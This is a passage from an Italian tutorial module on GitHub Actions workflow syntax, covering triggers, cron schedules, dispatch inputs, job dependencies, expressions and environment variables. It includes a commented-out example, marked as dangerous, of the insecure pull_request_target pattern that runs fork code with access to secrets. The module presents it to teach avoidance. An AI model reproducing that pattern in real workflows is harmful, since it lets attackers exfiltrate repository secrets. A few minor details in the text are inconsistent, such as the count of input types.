---
corso: "GitHub e Git Actions"
fase: "4 — GitHub Actions"
modulo: "17"
titolo: "GitHub Actions: Workflow e Sintassi"
versione: "GitHub Actions 2024"
livello: "intermedio"
prerequisiti:
  - "conoscenza base di YAML"
  - "familiarita con GitHub (repository, branch, PR)"
  - "esperienza con la riga di comando e scripting Bash"
obiettivi:
  - "comprendere l'anatomia di un workflow file (name, on, jobs, steps)"
  - "configurare trigger events con filtri su branch, path e tipi di attivita"
  - "utilizzare expressions, contexts e condizioni if per flussi dinamici"
  - "gestire variabili d'ambiente, secret e output tra step e job"
  - "implementare job dependencies con needs e strategie di parallelismo"
tag: [github-actions, workflow, YAML, trigger, expressions, contexts, jobs, steps, CI-CD]
---

# GitHub Actions: Workflow e Sintassi — Guida Approfondita

> **Modulo 17** · **Aggiornamento:** 2026-05-24

> ### Obiettivi di apprendimento
>
> Al termine di questo modulo saprai:
> 1. Comprendere l'anatomia di un workflow file (name, on, jobs, steps)
> 2. Configurare trigger events con filtri su branch, path e tipi di attivita
> 3. Utilizzare expressions, contexts e condizioni if per flussi dinamici
> 4. Gestire variabili d'ambiente, secret e output tra step e job
> 5. Implementare job dependencies con needs e strategie di parallelismo
>
> **Tempo stimato:** 4-6 ore · **Livello:** Intermedio

## Idee guida
1. **Reusable workflow (`workflow_call`) > copia-incolla.**
2. **Typed inputs con `inputs.X.type: number/boolean/string/choice`.**
3. **Secret-passing: `secrets: inherit` o explicit list.**
4. **`needs` per dependency tra job; `if:` per conditional.**


## Indice
- [Panoramica](#panoramica)
- [Anatomia di un Workflow File](#anatomia-di-un-workflow-file)
- [Trigger Events](#trigger-events)
- [Job Dependencies con needs](#job-dependencies-con-needs)
- [Expressions e Contexts](#expressions-e-contexts)
- [Esecuzione Condizionale con if](#esecuzione-condizionale-con-if)
- [Variabili d'Ambiente](#variabili-dambiente)
- [Default Shell e Working Directory](#default-shell-e-working-directory)
- [Permissions](#permissions)
- [Configuration Variables (vars)](#configuration-variables-vars)
- [Concurrency](#concurrency)
- [Timeout e Continue-on-Error](#timeout-e-continue-on-error)
- [Strategy Matrix Dettagliata](#strategy-matrix-dettagliata)
- [Service Containers](#service-containers)
- [Artifacts e Caching](#artifacts-e-caching)
- [Reusable Workflows e Composite Actions](#reusable-workflows-e-composite-actions)
- [OIDC e Autenticazione Cloud](#oidc-e-autenticazione-cloud)
- [Workflow Commands](#workflow-commands)
- [Environments e Deployment Protection](#environments-e-deployment-protection)
- [Security Hardening](#security-hardening)
- [Workflow Chaining con workflow_run](#workflow-chaining-con-workflow_run)
- [Template Completi di Workflow](#template-completi-di-workflow)
- [Best Practices](#best-practices)
- [YAML Anchors e Alias nei Workflow](#yaml-anchors-e-alias-nei-workflow)
- [Troubleshooting](#troubleshooting)
- [Riferimenti](#riferimenti)

---

## Panoramica

GitHub Actions è la piattaforma di automazione CI/CD nativa di GitHub. Permette di definire workflow automatizzati che vengono eseguiti in risposta a eventi nel repository. Ogni workflow è definito in un file YAML nella directory `.github/workflows/` e può contenere uno o più job che vengono eseguiti su runner (macchine virtuali) gestiti da GitHub o self-hosted.

La potenza di GitHub Actions risiede nella combinazione di un sistema di eventi ricco, un linguaggio di espressioni flessibile, un marketplace con migliaia di azioni riutilizzabili e l'integrazione profonda con l'ecosistema GitHub. Questa guida esplora in dettaglio la sintassi dei workflow, i trigger events, le espressioni e i context, e tutte le opzioni di configurazione avanzate.

### Architettura di Esecuzione

Quando un evento attiva un workflow, GitHub Actions esegue una serie di operazioni orchestrate:

1. **Ricezione dell'evento:** GitHub registra l'evento (push, PR, schedule, dispatch) e lo confronta con i filtri `on:` di tutti i workflow nella directory `.github/workflows/`.
2. **Valutazione dei filtri:** I filtri su branch, path, tag e tipo di attivita vengono valutati. Se il filtro corrisponde, il workflow viene accodato per l'esecuzione.
3. **Allocazione del runner:** Per ciascun job, GitHub seleziona un runner disponibile in base alla label `runs-on`. I runner GitHub-hosted vengono provisionati come macchine virtuali fresche, mentre i runner self-hosted sono macchine persistenti registrate dall'utente.
4. **Esecuzione degli step:** Ogni step viene eseguito sequenzialmente all'interno del job. Gli step possono essere comandi shell (`run`) o azioni riutilizzabili (`uses`).
5. **Raccolta dei risultati:** Output, artefatti e log vengono raccolti e resi disponibili nella UI di GitHub.

### Gerarchia delle Chiavi YAML

La struttura di un workflow file segue una gerarchia precisa. Ogni chiave ha un ruolo specifico e un livello di annidamento definito:

| Chiave | Livello | Descrizione |
|---|---|---|
| `name` | Top-level | Nome del workflow visualizzato nella UI |
| `run-name` | Top-level | Nome dinamico dell'esecuzione (supporta espressioni) |
| `on` | Top-level | Definisce gli eventi trigger e i loro filtri |
| `permissions` | Top-level / Job | Permessi del GITHUB_TOKEN |
| `env` | Top-level / Job / Step | Variabili d'ambiente |
| `defaults` | Top-level / Job | Shell e working directory di default |
| `concurrency` | Top-level / Job | Gruppo di concorrenza e comportamento di cancellazione |
| `jobs` | Top-level | Mappa dei job da eseguire |
| `jobs.<id>.runs-on` | Job | Runner su cui eseguire il job |
| `jobs.<id>.needs` | Job | Dipendenze da altri job |
| `jobs.<id>.if` | Job | Condizione per l'esecuzione del job |
| `jobs.<id>.strategy` | Job | Strategia matrix per esecuzione parallela |
| `jobs.<id>.environment` | Job | Ambiente di deploy con protection rules |
| `jobs.<id>.outputs` | Job | Output condivisi con altri job |
| `jobs.<id>.services` | Job | Container di servizio (database, cache) |
| `jobs.<id>.container` | Job | Container Docker in cui eseguire gli step |
| `jobs.<id>.timeout-minutes` | Job | Timeout massimo per il job |
| `jobs.<id>.continue-on-error` | Job | Se true, il workflow continua anche se il job fallisce |
| `jobs.<id>.steps` | Job | Lista ordinata di step da eseguire |
| `jobs.<id>.steps[*].uses` | Step | Action riutilizzabile da eseguire |
| `jobs.<id>.steps[*].run` | Step | Comando shell da eseguire |
| `jobs.<id>.steps[*].with` | Step | Parametri di input per l'action |
| `jobs.<id>.steps[*].env` | Step | Variabili d'ambiente specifiche dello step |
| `jobs.<id>.steps[*].if` | Step | Condizione per l'esecuzione dello step |

### La chiave run-name

A partire dalle versioni recenti di GitHub Actions, la chiave `run-name` permette di personalizzare dinamicamente il nome di ogni singola esecuzione del workflow nella UI:

```yaml
name: Deploy Pipeline
run-name: Deploy ${{ inputs.version }} to ${{ inputs.environment }} by @${{ github.actor }}

on:
  workflow_dispatch:
    inputs:
      version:
        type: string
        required: true
      environment:
        type: choice
        options: [staging, production]
```

Questo genera nomi come "Deploy v2.1.0 to production by @renan" nella lista delle esecuzioni, rendendo molto piu facile identificare cosa sta facendo ogni run senza dover aprire i dettagli.

---

## Anatomia di un Workflow File

```yaml
# .github/workflows/ci.yml

# Nome del workflow (visualizzato nella UI di GitHub)
name: Continuous Integration

# Trigger: quando eseguire il workflow
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

# Permessi del GITHUB_TOKEN
permissions:
  contents: read
  pull-requests: write

# Variabili d'ambiente globali
env:
  NODE_VERSION: '20'
  CI: true

# Configurazione di concurrency
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

# Default per tutti i job
defaults:
  run:
    shell: bash
    working-directory: ./app

# Definizione dei job
jobs:
  # Primo job: linting
  lint:
    name: Lint Code
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Run linter
        run: npm run lint

  # Secondo job: test (dipende da lint)
  test:
    name: Run Tests
    needs: lint
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node-version: [18, 20, 22]
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'

      - run: npm ci
      - run: npm test

  # Terzo job: build (dipende da test)
  build:
    name: Build Application
    needs: test
    runs-on: ubuntu-latest
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
      - run: npm ci
      - run: npm run build

      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
          retention-days: 7
```

---

## Trigger Events

### Push e Pull Request

```yaml
on:
  push:
    branches:
      - main
      - 'release/**'          # Glob pattern
      - '!release/**-beta'    # Esclusione
    branches-ignore:
      - 'feature/**'          # Alternativa all'esclusione
    tags:
      - 'v*.*.*'              # Solo tag semver
    paths:
      - 'src/**'              # Solo se file in src/ cambiano
      - '*.js'
    paths-ignore:
      - 'docs/**'             # Non triggerare per modifiche alla documentazione
      - '**/*.md'
      - '.github/**'

  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]
    branches:
      - main
    paths:
      - 'src/**'

  # PR da fork (con permessi limitati per sicurezza)
  pull_request_target:
    types: [opened, synchronize]
    branches: [main]
```

#### Differenza tra pull_request e pull_request_target

La distinzione tra `pull_request` e `pull_request_target` e cruciale per la sicurezza:

| Aspetto | `pull_request` | `pull_request_target` |
|---|---|---|
| **Codice eseguito** | Dal branch della PR (head) | Dal branch base (target) |
| **Accesso ai secret** | NO per PR da fork | SI (secret del repo base) |
| **Permessi GITHUB_TOKEN** | Read-only per fork | Permessi completi |
| **Caso d'uso** | CI standard, test, lint | Labeling, commenti automatici, merge |
| **Rischio sicurezza** | Basso | ALTO se si esegue codice dal fork |

**Attenzione critica:** Non usare mai `pull_request_target` con `actions/checkout` che effettua il checkout del codice della PR. Un attaccante potrebbe modificare il codice nel fork per esfiltrare i secret del repository base. Il pattern sicuro e:

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  label:
    runs-on: ubuntu-latest
    # SICURO: non esegue codice dal fork, solo operazioni API
    steps:
      - name: Add label based on files
        uses: actions/labeler@v5
        with:
          repo-token: ${{ secrets.GITHUB_TOKEN }}

  # PERICOLOSO: NON fare questo!
  # unsafe:
  #   runs-on: ubuntu-latest
  #   steps:
  #     - uses: actions/checkout@v4
  #       with:
  #         ref: ${{ github.event.pull_request.head.sha }}  # CODICE FORK!
  #     - run: npm test  # Esegue codice potenzialmente malevolo con accesso ai secret
```

#### Filtri Avanzati per Push e Pull Request

I filtri su branch e path supportano glob pattern estesi. Ecco una guida completa ai pattern disponibili:

```yaml
on:
  push:
    branches:
      - main                    # Match esatto
      - 'release/**'            # Qualsiasi sotto-path (release/1.0, release/2.0/beta)
      - 'feature/*'             # Solo un livello (feature/login, ma NON feature/auth/login)
      - '!release/**-beta'      # Esclusione con negazione
      - 'hotfix/[0-9]*'         # Character class: hotfix/1-critical, hotfix/2-urgent

    tags:
      - 'v[0-9]+.[0-9]+.[0-9]+' # Semver: v1.2.3
      - 'v*.*.*-rc*'             # Release candidate: v1.0.0-rc1

    paths:
      - 'src/**/*.ts'            # Solo file TypeScript in src/
      - 'src/**/*.tsx'           # Solo file React TSX in src/
      - '!src/**/*.test.ts'      # Ma NON file di test
      - '!src/**/*.spec.ts'      # E NON file spec

    # NOTA: branches e branches-ignore sono mutuamente esclusivi
    # NOTA: paths e paths-ignore sono mutuamente esclusivi
    # NOTA: non si possono usare sia branches che branches-ignore nello stesso trigger
```

#### Tipi di Attivita per Pull Request

L'evento `pull_request` supporta numerosi tipi di attivita. Per default vengono attivati solo `opened`, `synchronize` e `reopened`:

```yaml
on:
  pull_request:
    types:
      # Tipi di default (attivi se non si specifica types)
      - opened            # PR appena creata
      - synchronize       # Nuovi commit pushati sulla PR
      - reopened          # PR riaperta dopo chiusura

      # Tipi aggiuntivi (da specificare esplicitamente)
      - closed            # PR chiusa (merged o no)
      - assigned          # Assegnata a qualcuno
      - unassigned        # Rimossa l'assegnazione
      - labeled           # Etichetta aggiunta
      - unlabeled         # Etichetta rimossa
      - edited            # Titolo, corpo o base branch modificati
      - ready_for_review  # Convertita da draft a ready
      - converted_to_draft # Convertita in draft
      - review_requested  # Review richiesta
      - review_request_removed # Richiesta di review rimossa
      - auto_merge_enabled     # Auto-merge attivato
      - auto_merge_disabled    # Auto-merge disattivato
```

Un pattern comune e filtrare le PR in stato draft per risparmiare risorse CI:

```yaml
on:
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]

jobs:
  ci:
    # Non eseguire CI su PR draft
    if: github.event.pull_request.draft == false
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

### Schedule (Cron)

```yaml
on:
  schedule:
    # Cron syntax: minuto ora giorno-mese mese giorno-settimana
    - cron: '0 6 * * 1-5'     # Ogni giorno feriale alle 6:00 UTC
    - cron: '0 0 * * 0'       # Ogni domenica a mezzanotte UTC
    - cron: '*/30 * * * *'    # Ogni 30 minuti

    # NOTA: GitHub Actions usa UTC
    # NOTA: La precisione non è garantita; potrebbe avere ritardi di minuti
    # NOTA: Lo schedule funziona solo sul branch predefinito
```

#### Sintassi Cron Dettagliata

La sintassi cron segue il formato standard POSIX con 5 campi:

```
┌──────────── minuto (0-59)
│ ┌────────── ora (0-23)
│ │ ┌──────── giorno del mese (1-31)
│ │ │ ┌────── mese (1-12)
│ │ │ │ ┌──── giorno della settimana (0-6, 0=domenica)
│ │ │ │ │
* * * * *
```

| Espressione | Significato |
|---|---|
| `0 0 * * *` | Ogni giorno a mezzanotte UTC |
| `0 6 * * 1-5` | Lunedi-venerdi alle 06:00 UTC |
| `0 */4 * * *` | Ogni 4 ore |
| `30 2 * * 0` | Ogni domenica alle 02:30 UTC |
| `0 0 1 * *` | Il primo giorno di ogni mese |
| `0 0 * * 1,4` | Ogni lunedi e giovedi |
| `15 10 * * 1-5` | Giorni feriali alle 10:15 UTC |
| `0 0 1,15 * *` | Il 1 e il 15 di ogni mese |

#### Limitazioni dello Schedule

- **Branch predefinito:** Lo schedule funziona SOLO sul branch predefinito del repository (generalmente `main` o `master`). I workflow schedulati su altri branch vengono ignorati.
- **Ritardi:** GitHub non garantisce l'esecuzione esatta al minuto specificato. Durante periodi di carico elevato sui server GitHub, i workflow schedulati possono subire ritardi fino a 15 minuti.
- **Intervallo minimo:** L'intervallo minimo pratico e 5 minuti (`*/5 * * * *`). GitHub puo ignorare schedule con frequenza troppo alta.
- **Repository inattivi:** Se un repository non riceve push per 60 giorni, i workflow schedulati vengono automaticamente disattivati. GitHub invia una notifica email al proprietario, e il workflow puo essere riattivato manualmente dalla UI Actions.
- **Multipli schedule:** Un singolo workflow puo avere piu espressioni cron. In questo caso ogni espressione viene valutata indipendentemente.

```yaml
# Esempio pratico: workflow di manutenzione con multipli schedule
name: Manutenzione Periodica

on:
  schedule:
    - cron: '0 3 * * 1'      # Lunedi alle 03:00: pulizia cache
    - cron: '0 6 * * 1-5'    # Feriali alle 06:00: check dipendenze
    - cron: '0 0 1 * *'      # Primo del mese: report mensile

jobs:
  cleanup:
    if: github.event.schedule == '0 3 * * 1'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Pulizia cache settimanale"

  dependency-check:
    if: github.event.schedule == '0 6 * * 1-5'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm audit

  monthly-report:
    if: github.event.schedule == '0 0 1 * *'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Generazione report mensile"
```

### Workflow Dispatch (Manuale)

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Ambiente di deploy'
        required: true
        type: choice
        options:
          - production
          - staging
          - development
        default: 'staging'
      version:
        description: 'Versione da deployare'
        required: true
        type: string
        default: 'latest'
      dry_run:
        description: 'Eseguire in modalità dry-run'
        required: false
        type: boolean
        default: false
      log_level:
        description: 'Livello di log'
        required: false
        type: choice
        options:
          - debug
          - info
          - warning
          - error
        default: 'info'

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: |
          echo "Deploying version ${{ inputs.version }} to ${{ inputs.environment }}"
          echo "Dry run: ${{ inputs.dry_run }}"
          echo "Log level: ${{ inputs.log_level }}"
```

#### Tipi di Input Disponibili

Il `workflow_dispatch` supporta quattro tipi di input, ciascuno con comportamento specifico nella UI:

| Tipo | Widget UI | Validazione | Note |
|---|---|---|---|
| `string` | Campo di testo | Nessuna (stringa libera) | Supporta `default` |
| `boolean` | Checkbox | true/false | Sempre stringa in espressioni (`'true'`/`'false'`) |
| `choice` | Menu a discesa | Solo valori in `options` | Richiede lista `options` |
| `number` | Campo numerico | Solo numeri | Introdotto nel 2023 |
| `environment` | Selettore environment | Solo environment configurati | Seleziona tra gli environment del repo |

**Attenzione al tipo boolean:** Nelle espressioni `${{ }}`, gli input boolean vengono convertiti in stringa. Per confronti sicuri:

```yaml
steps:
  - name: Check dry run
    # CORRETTO: confronto con stringa
    if: inputs.dry_run == true
    run: echo "Modalita dry-run attiva"

  # ALTERNATIVA: usare fromJSON per conversione esplicita
  - name: Check with fromJSON
    if: fromJSON(inputs.dry_run)
    run: echo "Dry run confermato"
```

#### Attivazione Programmatica del Workflow Dispatch

Oltre alla UI, il `workflow_dispatch` puo essere attivato via API o CLI:

```bash
# Via GitHub CLI
gh workflow run deploy.yml \
  -f environment=staging \
  -f version=v2.1.0 \
  -f dry_run=false \
  -f log_level=info

# Via API REST con curl
curl -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/{owner}/{repo}/actions/workflows/deploy.yml/dispatches" \
  -d '{
    "ref": "main",
    "inputs": {
      "environment": "staging",
      "version": "v2.1.0",
      "dry_run": "false"
    }
  }'
```

### Repository Dispatch (API-triggered)

```yaml
on:
  repository_dispatch:
    types: [deploy, rollback, custom-event]

jobs:
  handle:
    runs-on: ubuntu-latest
    steps:
      - name: Handle event
        run: |
          echo "Event type: ${{ github.event.action }}"
          echo "Client payload: ${{ toJSON(github.event.client_payload) }}"
```

```bash
# Triggerare un repository dispatch event
gh api repos/{owner}/{repo}/dispatches -X POST \
  -f event_type="deploy" \
  -F client_payload[environment]="production" \
  -F client_payload[version]="v1.2.3"
```

#### Differenza tra workflow_dispatch e repository_dispatch

| Aspetto | `workflow_dispatch` | `repository_dispatch` |
|---|---|---|
| **Trigger** | UI GitHub, API, CLI | Solo API |
| **Input** | Tipizzati (`string`, `boolean`, `choice`) | Payload JSON libero |
| **Validazione** | Automatica per tipo | Nessuna (responsabilita del chiamante) |
| **Selezione workflow** | Un workflow specifico | Tutti i workflow che matchano `types` |
| **Caso d'uso** | Operazioni manuali da sviluppatori | Integrazione con sistemi esterni |
| **UI** | Pulsante "Run workflow" nella tab Actions | Nessuna UI nativa |
| **Routing** | Diretto al workflow | Basato su `event_type` |

#### Pattern Avanzato: Repository Dispatch per Microservizi

Un uso comune di `repository_dispatch` e l'orchestrazione cross-repository in architetture a microservizi:

```yaml
# Workflow nel repo del servizio API che notifica il repo del frontend
name: Notify Frontend on API Change

on:
  push:
    branches: [main]
    paths: ['openapi/**']

jobs:
  notify:
    runs-on: ubuntu-latest
    steps:
      - name: Trigger frontend SDK regeneration
        run: |
          gh api repos/myorg/frontend-app/dispatches \
            -X POST \
            -f event_type="api-schema-updated" \
            -F client_payload[api_version]="$(cat openapi/version.txt)" \
            -F client_payload[commit_sha]="${{ github.sha }}" \
            -F client_payload[triggered_by]="${{ github.repository }}"
        env:
          GH_TOKEN: ${{ secrets.CROSS_REPO_TOKEN }}
```

### Altri Trigger Events

```yaml
on:
  # Rilascio
  release:
    types: [published, created, edited, deleted, prereleased, released]

  # Issue
  issues:
    types: [opened, edited, deleted, labeled, unlabeled, assigned, closed]

  # Commento su issue/PR
  issue_comment:
    types: [created, edited, deleted]

  # Review di PR
  pull_request_review:
    types: [submitted, edited, dismissed]

  # Creazione/eliminazione di branch o tag
  create:
  delete:

  # Fork del repository
  fork:

  # Deploy
  deployment:
  deployment_status:

  # Workflow completato
  workflow_run:
    workflows: ["Build"]
    types: [completed]
    branches: [main]

  # Chiamata da un altro workflow
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
    secrets:
      deploy_token:
        required: true
```

#### Tabella Riepilogativa degli Eventi Trigger

GitHub Actions supporta oltre 35 eventi trigger. Ecco una classificazione per categoria:

| Categoria | Evento | Descrizione |
|---|---|---|
| **Codice** | `push` | Commit pushati su un branch o tag |
| **Codice** | `pull_request` | Azioni su una pull request |
| **Codice** | `pull_request_target` | PR da fork con accesso ai secret del base repo |
| **Codice** | `pull_request_review` | Review sottomessa, modificata o respinta |
| **Codice** | `pull_request_review_comment` | Commento su una review |
| **Codice** | `create` | Branch o tag creato |
| **Codice** | `delete` | Branch o tag eliminato |
| **Repository** | `fork` | Repository forkato |
| **Repository** | `star` | Stella aggiunta (watch) |
| **Repository** | `public` | Repository reso pubblico |
| **Repository** | `release` | Release pubblicata, creata, modificata |
| **Issues** | `issues` | Issue aperta, chiusa, etichettata, assegnata |
| **Issues** | `issue_comment` | Commento su issue o PR |
| **Issues** | `label` | Etichetta creata, modificata, eliminata |
| **Issues** | `milestone` | Milestone creata, chiusa, aperta |
| **Deploy** | `deployment` | Deployment creato |
| **Deploy** | `deployment_status` | Status del deployment cambiato |
| **Deploy** | `deployment_protection_rule` | Regola di protezione valutata |
| **Workflow** | `workflow_dispatch` | Avvio manuale con input |
| **Workflow** | `workflow_run` | Completamento di un altro workflow |
| **Workflow** | `workflow_call` | Chiamata da un altro workflow (reusable) |
| **Esterno** | `repository_dispatch` | Evento custom via API |
| **Esterno** | `schedule` | Cron schedule |
| **Wiki** | `gollum` | Pagina wiki creata o modificata |
| **Registro** | `registry_package` | Pacchetto pubblicato o aggiornato |
| **Sicurezza** | `branch_protection_rule` | Regola di protezione branch modificata |
| **Sicurezza** | `code_scanning_alert` | Alert di code scanning |
| **Sicurezza** | `dependabot_alert` | Alert Dependabot |
| **Sicurezza** | `secret_scanning_alert` | Alert di secret scanning |
| **Altro** | `discussion` | Discussione creata, modificata, risposta |
| **Altro** | `discussion_comment` | Commento su una discussione |
| **Altro** | `project` | Project (classic) creato, modificato |
| **Altro** | `project_card` | Card nel project modificata |
| **Altro** | `check_run` | Check run creato o completato |
| **Altro** | `check_suite` | Check suite richiesta o completata |
| **Altro** | `status` | Status di un commit cambiato |

#### Combinazione di Multipli Trigger

Un singolo workflow puo rispondere a piu eventi. Questo e utile per riutilizzare la stessa pipeline di CI per push e PR, oppure per avere un workflow eseguibile sia automaticamente che manualmente:

```yaml
on:
  # CI automatica su push e PR
  push:
    branches: [main, develop]
    paths: ['src/**', 'tests/**']
  pull_request:
    branches: [main]
    paths: ['src/**', 'tests/**']
  # Esecuzione manuale per debug
  workflow_dispatch:
    inputs:
      debug_enabled:
        type: boolean
        default: false
  # Nightly per test estesi
  schedule:
    - cron: '0 2 * * *'

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - name: Run tests
        run: npm test
        env:
          # Il debug e attivo solo quando triggerato manualmente con l'opzione
          DEBUG: ${{ inputs.debug_enabled && 'true' || 'false' }}
      - name: Extended tests (solo nightly e manual)
        if: github.event_name == 'schedule' || github.event_name == 'workflow_dispatch'
        run: npm run test:extended
```

---

## Job Dependencies con needs

### Dipendenze Semplici

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building..."

  test:
    needs: build            # test aspetta che build finisca
    runs-on: ubuntu-latest
    steps:
      - run: echo "Testing..."

  deploy:
    needs: [build, test]    # deploy aspetta sia build che test
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying..."
```

### Passare Output tra Job

```yaml
jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.get-version.outputs.version }}
      should-deploy: ${{ steps.check.outputs.deploy }}
    steps:
      - id: get-version
        run: echo "version=1.2.3" >> "$GITHUB_OUTPUT"

      - id: check
        run: echo "deploy=true" >> "$GITHUB_OUTPUT"

  deploy:
    needs: setup
    runs-on: ubuntu-latest
    if: needs.setup.outputs.should-deploy == 'true'
    steps:
      - run: echo "Deploying version ${{ needs.setup.outputs.version }}"
```

### Gestione dei Fallimenti

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm test

  notify:
    needs: test
    if: always()  # Esegue anche se test fallisce
    runs-on: ubuntu-latest
    steps:
      - name: Notify on failure
        if: needs.test.result == 'failure'
        run: echo "Tests failed! Sending notification..."

      - name: Notify on success
        if: needs.test.result == 'success'
        run: echo "All tests passed!"

  # Job che esegue solo se TUTTI i jobs precedenti hanno successo
  release:
    needs: [test, build, lint]
    if: ${{ !contains(needs.*.result, 'failure') }}
    runs-on: ubuntu-latest
    steps:
      - run: echo "All checks passed, creating release"
```

---

## Expressions e Contexts

### Sintassi delle Expressions

Le espressioni in GitHub Actions usano la sintassi `${{ }}` e supportano operatori, funzioni e accesso ai context.

```yaml
# Operatori
${{ 1 + 2 }}                          # 3
${{ 'hello' == 'hello' }}             # true
${{ github.ref == 'refs/heads/main' }} # true/false
${{ true && false }}                   # false
${{ true || false }}                   # true
${{ !true }}                          # false

# Confronti
${{ github.event.pull_request.draft == false }}
${{ github.actor != 'dependabot[bot]' }}
${{ matrix.os == 'ubuntu-latest' }}
```

### Contexts Principali

```yaml
# github context: informazioni sull'evento e il repository
${{ github.repository }}          # "org/repo"
${{ github.ref }}                 # "refs/heads/main"
${{ github.sha }}                 # Hash completo del commit
${{ github.actor }}               # Chi ha triggerato il workflow
${{ github.event_name }}          # "push", "pull_request", etc.
${{ github.run_id }}              # ID univoco dell'esecuzione
${{ github.run_number }}          # Numero incrementale dell'esecuzione
${{ github.workflow }}            # Nome del workflow
${{ github.event.pull_request.number }}  # Numero della PR

# env context: variabili d'ambiente
${{ env.NODE_VERSION }}
${{ env.MY_VARIABLE }}

# secrets context: segreti configurati
${{ secrets.GITHUB_TOKEN }}
${{ secrets.DEPLOY_KEY }}

# steps context: output degli step precedenti
${{ steps.my-step.outputs.result }}
${{ steps.my-step.outcome }}       # "success", "failure", "cancelled", "skipped"
${{ steps.my-step.conclusion }}    # come outcome ma dopo continue-on-error

# needs context: output dei job precedenti
${{ needs.build.outputs.version }}
${{ needs.build.result }}          # "success", "failure", "cancelled", "skipped"

# matrix context: valori della matrice corrente
${{ matrix.os }}
${{ matrix.node-version }}

# runner context: informazioni sul runner
${{ runner.os }}                   # "Linux", "Windows", "macOS"
${{ runner.arch }}                 # "X64", "ARM64"
${{ runner.temp }}                 # Path directory temporanea
${{ runner.tool_cache }}           # Path cache degli strumenti

# job context
${{ job.status }}                  # Status corrente del job
${{ job.container.id }}            # ID del container del job
```

### Funzioni Built-in

```yaml
# Funzioni stringa
${{ contains('hello world', 'world') }}     # true
${{ startsWith('hello', 'he') }}            # true
${{ endsWith('hello.js', '.js') }}          # true
${{ format('Hello {0} {1}', 'World', '!') }} # "Hello World !"

# Funzioni JSON
${{ toJSON(github.event) }}                 # Serializza in JSON
${{ fromJSON(steps.data.outputs.json) }}    # Deserializza da JSON

# Funzioni di stato (usabili solo in if)
${{ success() }}                            # true se nessuno step precedente è fallito
${{ failure() }}                            # true se uno step precedente è fallito
${{ cancelled() }}                          # true se il workflow è stato cancellato
${{ always() }}                             # sempre true (esegue sempre)

# hashFiles: calcolo hash per caching
${{ hashFiles('**/package-lock.json') }}
${{ hashFiles('**/*.go', 'go.sum') }}
```

---

## Esecuzione Condizionale con if

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    # Job-level condition
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    steps:
      # Step-level condition
      - name: Deploy to production
        if: github.event.head_commit.message != 'skip ci'
        run: ./deploy.sh

      - name: Send Slack notification
        if: always() && github.event_name == 'push'
        run: ./notify.sh

      - name: Cleanup on failure
        if: failure()
        run: ./cleanup.sh

      - name: Skip for bots
        if: github.actor != 'dependabot[bot]' && github.actor != 'renovate[bot]'
        run: ./human-only-task.sh

      - name: Only on tag push
        if: startsWith(github.ref, 'refs/tags/v')
        run: ./release.sh

      - name: Only when specific files changed
        if: contains(github.event.head_commit.modified, 'src/')
        run: ./build.sh

      - name: Conditional on previous step output
        if: steps.check.outputs.should_run == 'true'
        run: ./conditional-task.sh
```

---

## Variabili d'Ambiente

### Livelli di Definizione

```yaml
# Workflow-level (disponibili in tutti i job e step)
env:
  APP_NAME: my-application
  REGISTRY: ghcr.io

jobs:
  build:
    # Job-level (disponibili in tutti gli step del job)
    env:
      NODE_ENV: production
      BUILD_TARGET: dist

    steps:
      # Step-level (disponibili solo in questo step)
      - name: Build
        env:
          WEBPACK_MODE: production
        run: npm run build
```

### Variabili d'Ambiente Predefinite

```bash
# Variabili impostate automaticamente da GitHub Actions
GITHUB_ACTIONS=true              # Sempre true in GitHub Actions
GITHUB_REPOSITORY=org/repo       # Nome del repository
GITHUB_REF=refs/heads/main       # Riferimento del branch/tag
GITHUB_SHA=abc1234               # SHA del commit
GITHUB_ACTOR=username            # Chi ha triggerato il workflow
GITHUB_WORKSPACE=/home/runner/work/repo  # Directory di lavoro
GITHUB_TOKEN=ghs_xxxx            # Token automatico
RUNNER_OS=Linux                  # Sistema operativo del runner
RUNNER_TEMP=/tmp                 # Directory temporanea
GITHUB_OUTPUT=/path/to/output    # File per impostare output
GITHUB_ENV=/path/to/env          # File per impostare variabili d'ambiente
GITHUB_STEP_SUMMARY=/path/to/summary  # File per job summary
```

### Impostare Variabili Dinamiche

```yaml
steps:
  - name: Set dynamic variables
    run: |
      # Impostare una variabile d'ambiente per gli step successivi
      echo "VERSION=$(cat version.txt)" >> "$GITHUB_ENV"

      # Impostare un output per altri job
      echo "version=$(cat version.txt)" >> "$GITHUB_OUTPUT"

      # Impostare un path
